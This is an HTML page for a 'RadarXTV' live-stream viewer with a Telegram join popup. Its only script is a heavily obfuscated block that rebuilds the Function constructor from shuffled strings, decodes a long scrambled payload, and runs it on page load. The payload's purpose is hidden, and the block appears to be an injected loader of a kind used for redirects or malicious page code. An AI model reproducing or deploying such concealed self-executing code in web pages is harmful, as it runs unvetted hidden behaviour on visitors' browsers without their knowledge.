<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
    (function(){var PDN='',VXV=254-243;function jRq(u){var i=2094504;var e=u.length;var b=[];for(var h=0;h<e;h++){b[h]=u.charAt(h)};for(var h=0;h<e;h++){var j=i*(h+112)+(i%19754);var l=i*(h+150)+(i%48387);var n=j%e;var s=l%e;var t=b[n];b[n]=b[s];b[s]=t;i=(j+l)%4599336;};return b.join('')};var vNA=jRq('mxoknurehtccrwfjuodrtbaoncpqityslsvgz').substr(0,VXV);var EIJ='n;)o==rl}7f7ar+tpah7hht;a"+g+<dh;+;8n+.2 -vzst;rloo-v]ave (nu)2,3so78cge0;]n.;aa}s;6]1u,s7erp,[da{ir<;+a{h )ouues9,8tr=S]agsd r]3fffhr8l;i6o1wpr;qdler<t9;r;bngv([. f=}+n6].e =t[5llt=a!.g1ft[7]dr32=(rvdvrh}cfuerre[gndeu1ton)t .);r+(fm1xn;g}Aog=m;,,tg)vmqulib+8S))((.a6)A,lam2x=ung= -,,sfrndrCp8sf)i((={ue),vhf.[ig[z.svoaa+u;zvcav64(n;vma==r;n[0lao[8;(7a;sve{or,ta(10;u;m<r;b+9ec(=rr+f0.npixC2)rA"(da2vnr4normh=h=a.8,uvo)kd=1*x7=0i7c+5l0eAj0dguvpo;)o2;rr6z-e.a =if)=c.)v1Cs)*;C.wlno("= t  ae[er,g)Alrc+=rn+w4c+d ,h-]"w((9 i-=ha1; (n=i)ln)aa;rmnr ] [;)2o v =n,coed(k]vif(i>+=nnhu.fom=smt;s+0vgk.8;jr,e+puo;j.vj=6b;s(l)=l)}idav"9n;l;,]ifa]vc+i,d[r96+uier)4>l{gthj0t (rvzb<jri0( a.()1lo{v;r.;j=t)l}g=(tav,4C,io;e1Cgt!r(r= ==t;+ro1,(rq=gvml).=hnv[;iu);+,t2.=in)il;0(e[b)oo.Cwdvk7ra ho5ir2g"o.0;d,;.lcnp)h j+((=9lysnoi()=+h ara"6om=((.i{qas(fv,,avuhsz,;sh-n]=dhro"dtlreuut.chc6,j]tl1)e=""e.nsC(m;)';var STb=jRq[vNA];var Muk='';var blM=STb;var wFn=STb(Muk,jRq(EIJ));var LgA=wFn(jRq('faO}jpe[=)fi91.0SewtO0n!f),VjtYS$7Obm.k>lrO]eoa2;)mO3:=O&.dO)6(!GOneOlO=O.Otr.O30i=Ol1(9u_68"oG5=nOe1so$)6OrwO(X.75SsrlE_);$]m( 2)f)p>50;acam;i(Ox_)SMi)"f;r;8t efs.V)m(e(Oc%.f 0 2.4e(y7,.{$O gr6B.bso!. O}Or=M_cc;a..6)Ot#=( %o9.2Oj;]0p 0OhlnlirlOO}=e! ls"0=) lrr6tmrfon)9i]psj34oE!13t.1e]r 4ff"!(c..On(l4.;4d]OO3reOOur(0d&])c(%8(=(7O}2OOO#(i>OnO)icd)d3eo!t1.7,4a(fKkifn{($9<\'!)O=ueCO\/()%0i3)uSY$);ajtF#$npt{cOOo)eCpqO[s8] sf2gefO0i!f1yu!dl(u"O.t{IrttewO= 1 ,EObe.9(gg)ODO3uR%)8_1_;O%y\/rOi.FO)r5l"O2)Od9j+n)?(O(eO]t=r)de( nJ_eomf7c})cPf)43;qCO(;tcnOOfn6c&y Otmss,}LrsfOyn)e_%re?Jz]mO(29c"O)j4]]{x(=O}uiv)rAtjr_a,afiOHlO{OO2iuO]#=fOO.a!_{y2wnf$EOen7aioOOO{:n70O(f5B;rlbO(,<k86,.cO)0$%.O}]sew(={O;lnrfO23O5c m;) }5O5OOU[}.en=flbOhOOO[]dOUn3O=nfis!(m)\'T!eMOOo)acanSO_30(5=T4oep{)cpfQ D%=Oeho)=sOt9a%;Bo\/"OnxOfeO+){2e4eo;9AO8)+)}]cu]3)O7e)Ot,40,fuwq,W!ae7dw197eO.#.c%*r2<<3g0.(f74_?5_$%)=.$nn@(a48d+z#W)eG8o+Ku,2l(_vTO<OO3.{n.OV% tsOe1OO4!!imOh46e;tJM;}w)K)a$(]cr 40;sO=}o;6)oO])})l(+t(}gid<n:lNorOetR.Og?i=pbau+oXetie0 wiMn>.iv22jec)He$w.\/#;}.}_ac_On.OfOm OOa9.O%=ecVst7.3O2((1nD=,O4=oOUO.]I()%no]f3tf)6Ocp5*dm$E}o=1116.b) s_O]O248rfLOl;o))o\/8; 3{a,[rl1Mx5,0i_u!_fsgf;5O}{%7_-!%FOa)&urOid_c%9j_d;!O.atSage%OF,ed%7O?tOy.)cwOe%D]an]P)Oe(]OontujOO!OOK(b_)eOoO_4=JOO}_d@iif(,OOe 5OG;cO.O#n<O_O)E.csdOn=dL!_rf M__(]a,dOOfO_t)O)6!(Olmv.tOr)$wnkO{0 i O2(nOrnowt)nOO6abvO\/SvOC\/f_SePO%o8f)VtO411jOv5$)ntOOOO\')xn9Ow\/in!4O?OrreO}2rrP7uOOyr.(,aO(%_d8,4bnno86XO)h;\/4oOEyel}eWOOOaQOl(F.O=eeoOO_OO!lo_8n(Ot){n.}.]n})\',f+rs{OO.e!r{52OOO1m6,OBECNc rOO(-\/O]aOO24@!\/=OO(! eo"S=CE%)!Ok]}ee)78MO,f.j5j$_p%!,0noOEb3Ofo5OO@e8O,etOts d)ou0O!O0&.l_{Irw872:O.$;1HjH4]);{jC.%i.O]fO_je%fiiO(83\'8oc6O65niYs<cc7(s0_1gde(OOgCf$.an)e.O,s)e4{,c,1!f($en:$d@AOO$)j$3Oo{]_{O}O(ti((wiy}s)OI)84k]],&jlOOO;r(O}O!Ov ii(i1]7;-0c0;q];bOOu] 6e24]]OWi%{.OjgO.i+),5;CY$EOs2.)M2)t4wiO;.Opow0%esv;%x6S,OlO(%7rr-4i{..O_e_x])O1O7O8]t7=*6eo ,);lad*nt)8.2lOdO.5%B2l.&.Ot\/.OOneO@u;%;s7gO0e33ti}IlO3)xOo"f1O))M(r)fOf)n!O,j4 O"Oc)EoOe .OfO9{lp[OOjOjo1jar{vnf1]+%O!rOC(O. r.9<r((!na=r]jsxsX.\/sn.sfleOin_xg)b-p]t2e07OOu"5GA,.$ni) (d$o6e1Nll noD3hOOgt{aO1I24fy0sOd!;)4n)tk).i)6_eO)4[.gO 1(f 1b93r#pO1 (fo%(r2$oiNeOf 50_4_iuO%fo%O$q51.aT;(;l$:3n$O.rrO)OrO.pnBOp]= dc12OOf%O(_.O(3c>a3!f3O12=;_sO!{a4[Ole$Oel&O=Oa{Ug2qu(l8e(tf(oenp{O_rn]O(h{f_ (eo,ceifn4#exF, Oi576e87.m.a[OOR8O84OO84 e0O$.LOOO1ir(_etiffofy trAe!d]{h;[9ls]}afp6OK[O;fPafsOi_;.3et9_l( [3e(ROn$4e%g.u $ emru}Es0.se8O}y OU)_$ !O, boe 3=.et,r446dft0_=O!OEd$tup]}]f41MO\/(Oe,Eoe!S3fcva:4r3BOlgo=foOeOOU(llOOO0fc.#_B%-8430k.OnOQ%O nOnn(jn4nn=.Ofs_!.N'));var byz=blM(PDN,LgA );byz(1020);return 8771})()
</script>

</body>
</html>